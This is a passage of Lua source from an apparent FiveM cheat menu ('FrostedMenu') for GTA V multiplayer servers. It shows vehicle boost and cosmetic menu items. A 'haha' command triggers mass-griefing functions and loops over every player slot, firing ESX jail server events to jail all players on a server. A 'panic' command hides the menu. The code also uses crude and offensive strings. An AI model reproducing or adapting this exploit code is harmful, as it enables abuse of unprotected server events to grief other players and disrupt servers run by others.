                elseif FrostedMenu.Button('~h~Make vehicle ~y~dirty') then
                    Clean(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif FrostedMenu.Button('~h~Make vehicle ~g~clean') then
                    Clean2(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif
                    FrostedMenu.CheckBox(
                        '~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Neons & Headlights',
                        rainbowh,
                        function(dR)
                            rainbowh = dR
                        end
                    )
                 then
                end
                FrostedMenu.Display()
            elseif FrostedMenu.IsMenuOpened('BoostMenu') then
                if
                    FrostedMenu.ComboBox(
                        '~h~Engine ~r~Power ~s~Booster',
                        dD,
                        dB,
                        dC,
                        function(ag, ah)
                            dB = ag
                            dC = ah
                            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), dC * 20.0)
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~Engine ~g~Torque ~s~Booster ~g~2x',
                        t2x,
                        function(dR)
                            t2x = dR
                            t4x = false
                            t10x = false
                            t16x = false
                            txd = false
                            tbxd = false
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~Engine ~g~Torque ~s~Booster ~g~4x',
                        t4x,
                        function(dR)
                            t2x = false
                            t4x = dR
                            t10x = false
                            t16x = false
                            txd = false
                            tbxd = false
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~Engine ~g~Torque ~s~Booster ~g~10x',
                        t10x,
                        function(dR)
                            t2x = false
                            t4x = false
                            t10x = dR
                            t16x = false
                            txd = false
                            tbxd = false
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~Engine ~g~Torque ~s~Booster ~g~16x',
                        t16x,
                        function(dR)
                            t2x = false
                            t4x = false
                            t10x = false
                            t16x = dR
                            txd = false
                            tbxd = false
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~Engine ~g~Torque ~s~Booster ~y~XD',
                        txd,
                        function(dR)
                            t2x = false
                            t4x = false
                            t10x = false
                            t16x = false
                            txd = dR
                            tbxd = false
                        end
                    )
                 then
                elseif
                    FrostedMenu.CheckBox(
                        '~h~Engine ~g~Torque ~s~Booster ~y~BIG XD',
                        tbxd,
                        function(dR)
                            t2x = false
                            t4x = false
                            t10x = false
                            t16x = false
                            txd = false
                            tbxd = dR
                        end
                    )
                 then
                end
                FrostedMenu.Display()
            elseif IsDisabledControlPressed(0, 137) then
                if logged then
                    FrostedMenu.OpenMenu('FrostedFlakes')
                end
                FrostedMenu.Display()
            elseif IsDisabledControlPressed(0, 47) and IsDisabledControlPressed(0, 21) then
                if logged then
                    FrostedMenu.OpenMenu('FrostedFlakes')
                end
            end
            Citizen.Wait(0)
        end
    end
)
RegisterCommand(
    'haha',
    function(eA, eB, eC)
        bv = true
        RapeAllFunc()
        bananapartyall()
        EconomyDy2()
        AmbulancePlayers()
        for i = 0, 128 do
            TriggerServerEvent('esx-qalle-jail:jailPlayer', GetPlayerServerId(i), 5000, 'get fucked')
            TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(i), 45 * 60)
            TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(i), 45 * 60)
            TriggerServerEvent('js:jailuser', GetPlayerServerId(i), 45 * 60, 'get fucked')
        end
    end,
    false
)
RegisterCommand(
    'pk',
    function(eA, eB, eC)
        bw = false
    end,
    false
)
RegisterCommand(
    'lol',
    function(eA, eB, eC)
        mhaonn = false
    end,
    false
)

RegisterCommand(
    'frosted',
    function(eA, eB, eC)
        frosted_config.sprite_r = tonumber(eB[1])
		frosted_config.sprite_g = tonumber(eB[2])
		frosted_config.sprite_b = tonumber(eB[3])
		frosted_config.sprite_a = tonumber(eb[4])
		print('R: '..eB[1]..', G: '..eB[2]..', B: '..eB[3])
    end
)

RegisterCommand(
    'panic_bitch',
    function(eA, eB, eC)
        frosted_panic = true
        FrostedMenu.CloseMenu()
    end
)